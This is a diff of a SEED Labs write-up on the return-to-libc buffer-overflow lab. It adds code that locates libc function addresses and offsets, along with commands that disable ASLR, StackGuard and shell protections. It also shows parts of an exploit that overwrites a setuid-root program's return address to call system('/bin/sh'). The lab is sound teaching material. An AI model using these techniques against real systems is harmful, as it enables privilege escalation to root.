@@ -19,25 +19,25 @@ For general overview and the setup package for this lab, please go to [SEED Labs
 
 ```console
      Non-Executable Stack
------------------------------
++---------------------------+
 |                      <--  |
 | ...                    |  |
--------------------------|---
++------------------------|--+
 |     String Argument    |  |
--------------------------|--- <--- %ebp + 8
++------------------------|--+ <--- %ebp + 8
 |     Return Address     |  |--------------> system() function
--------------------------|---
++------------------------|--+
 | Previous Frame Pointer |  |          
-|------------------------|--| <--- %ebp
++------------------------|--+ <--- %ebp
 | ...           Overflow |  |
 | ...           Buffer   |  |
------------------------------
++---------------------------+
 |                           |
 ```
 
-## Environment Setup
+## Environment Setup and Preparation
 
-First, Ubuntu and several other Linux-based systems use **address space randomization** to randomize the starting address of heap and stack, making guessing the exact addresses difficult. Guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable this
+First of all, Ubuntu and several other Linux-based systems use **address space randomization** to randomize the starting address of heap and stack, making guessing the exact addresses difficult. Guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable this
 feature using the following command:
 
 ```console
@@ -46,7 +46,7 @@ $ sudo sysctl -w kernel.randomize_va_space=0
 
 When the memory address randomization is turned off, for the *same* program, the <code>libc</code> library is always loaded in the *same* memory address.
 
-The <code>gcc</code> compiler implements a security mechanism called *StackGuard* to prevent buffer overflows. In the presence of this protection, buffer overflow attacks do not work. We can compile a program with StackGuard disabled using the <code>-fno-stack-protector</code> option:
+The <code>gcc</code> compiler implements a security mechanism called **StackGuard** to prevent buffer overflows. In the presence of this protection, buffer overflow attacks do not work. We can compile a program with StackGuard disabled using the <code>-fno-stack-protector</code> option:
 
 ```console
 # Use the -m32 flag to compile the program into 32-bit binary
@@ -66,6 +66,94 @@ Link <code>/bin/sh</code> to <code>zsh</code> to disable the protection by <code
 ```console
 $ sudo ln -sf /bin/zsh /bin/sh
 ```
+
+Since our goal is to overwrite the return address of a vulnerable program with an address of our choice (in this assignment, the address of a C standard library function) that enables us to bypass the non-executable stack, it is natural to be curious about where those functions are.
+
+```c
+/* sysa1.c */
+extern int system(), exit(), execv();
+
+main() {
+        printf("system(): 0x%08x\n", system);
+        printf("exit(): 0x%08x\n", exit);
+        printf("execv(): 0x%08x\n", execv);
+}
+```
+
+Compile and run the above program:
+
+```console
+$ gcc -m32 -fno-stack-protector -z noexecstack -o sysa1 sysa1.c
+$ ./sysa1
+system(): 0xf7e03370
+exit(): 0xf7df5ed0
+execv(): 0xf7e8a410
+```
+
+In this second program, we ask the <code>dlsym()</code> function to return the addresses where these three shared objects are dynamically loaded into memory:
+
+```c
+#include <stdio.h>
+#include <dlfcn.h>
+
+void main()
+{
+        void *h, *p;
+
+        h = dlopen(NULL, RTLD_LAZY);
+        p = dlsym(h, "system");
+        printf("system(): 0x%08x\n", p);
+        p = dlsym(h, "exit");
+        printf("exit(): 0x%08x\n", p);
+        p = dlsym(h, "execv");
+        printf("execv(): 0x%08x\n", p);
+}
+```
+
+```c
+#include <dlfcn.h>
+
+/**
+ * If (filename == NULL), returns a global symbol object handle;
+ * via dlsym(), this handle provides access to the symbols
+ * exported from the main application and dependent DLLs for the
+ * main application that were loaded at program start-up.
+ * The RTLD_LAZY flag is specified to defer the symbol
+ * resolution until the first reference to the symbol.
+ */
+void *dlopen(const char *filename, int flags);
+void *dlsym(void *restrict handle, const char *restrict symbol);
+```
+
+The <code>dlfcn.h</code> header file requires that <code>-ldl</code> be used with <code>gcc</code>, which tells the linker to link the <code>dl</code> library.
+
+```console
+$ ./sysa2
+system(): 0xf7dfd370
+exit(): 0xf7defed0
+execv(): 0xf7e84410
+```
+
+Two programs produce different results because they refer to different symbols.
+
+```console
+$ ldd ./sysa1
+        linux-gate.so.1 (0xf7fcf000)
+        libc.so.6 => /lib32/libc.so.6 (0xf7dbd000)
+        /lib/ld-linux.so.2 (0xf7fd1000)
+$ ldd ./sysa2
+        linux-gate.so.1 (0xf7fcf000)
+        libdl.so.2 => /lib32/libdl.so.2 (0xf7fa3000)
+        libc.so.6 => /lib32/libc.so.6 (0xf7db7000)
+        /lib/ld-linux.so.2 (0xf7fd1000)
+$ python
+>>> 0xf7e03370 - 0xf7dbd000
+287600
+>>> 0xf7dfd370 - 0xf7db7000
+287600
+```
+
+It is shown here that <code>system()</code> has an offset of <code>287600</code> from the start of <code>libc</code>. Similarly, we can find the offsets of other library functions.
 
 Finally, we can compile our target vulnerable program <code>retlib.c</code>:
 
@@ -122,11 +210,11 @@ void foo()
 ```
 
 ```console
-seed@xingjian:~$ make
+$ make
 gcc -m32 -DBUF_SIZE=12 -fno-stack-protector -z noexecstack -o retlib retlib.c
 sudo chown root retlib && sudo chmod 4755 retlib
-seed@xingjian:~$ ls
-Makefile    exploit.py  retlib  retlib.c
+$ ls
+Makefile exploit.py retlib retlib.c
 ```
 
 ## Task 1: Finding out the Addresses of <code>libc</code> Functions
@@ -221,7 +309,7 @@ $ ./prtenv
 ffffd838
 ```
 
-It should be noted that the address of the <code>MYSHELL</code> environment variable is sensitive to the length of the program name because the program name is pushed onto the stack before environment variables.
+It should be noted that the address of the <code>MYSHELL</code> environment variable is sensitive to the length of the program name because the program name is pushed onto the stack ahead of environment variables.
 
 ```console
 $ mv prtenv ppprtenv
@@ -257,9 +345,9 @@ The program name is stored at address <code>0xffffdfcc</code>.
 
 ## Task 3: Launching the Attack
 
-In the return-to-libc attack, we need to place the argument (i.e., the address of the "<code>/bin/sh</code>" string) on the stack before the vulnerable function junps to the <code>system()</code> function by means of overflowing the target buffer.
+In the return-to-libc attack, we need to place the argument (i.e., the address of the "<code>/bin/sh</code>" string) on the stack before the vulnerable function jumps to the <code>system()</code> function by means of overflowing the target buffer. According to the [Linux manual page](https://man7.org/linux/man-pages/man3/system.3.html), the <code>system(ARG)</code> function first <code>fork()</code> a child process and then executes the command specified by <code>ARG</code> using <code>execl()</code> within that children. The arguments of the <code>execl()</code> function is a list of pointers to NULL-terminated character strings.
 
-The <code>exploit.py</code> file is provided to help us create the content of <code>badfile</code>:
+The <code>exploit.py</code> program file is provided to help us create the content of <code>badfile</code>:
 
 ```python
 #!/usr/bin/env python3
@@ -285,7 +373,7 @@ with open("badfile", "wb") as f:
   f.write(content)
 ```
 
-To figure out the three addresses and the values for <code>X</code>, <code>Y</code>, and <code>Z</code>, we can debug the <code>retlib.c</code> program and calculate the distance between <code>%ebp</code> and <code>buffer</code> inside the function <code>bof</code>:
+To figure out the three addresses and the values for <code>X</code>, <code>Y</code>, and <code>Z</code>, we can debug the <code>retlib.c</code> program and calculate the distance between <code>%ebp</code> and <code>buffer</code> inside the function <code>bof()</code>:
 
 ```console
 $ gcc -m32 -fno-stack-protector -z noexecstack -g -o retlib_dbg retlib.c
@@ -325,7 +413,7 @@ system_addr = 0xf7e08420
 Z = 24 + 8 = 32
 exit_addr = 0xf7dfaf80
 
-X = 24 + 12 = 36</code>
+X = 24 + 12 = 36
 sh_addr = 0xf7f52352
 ```
 
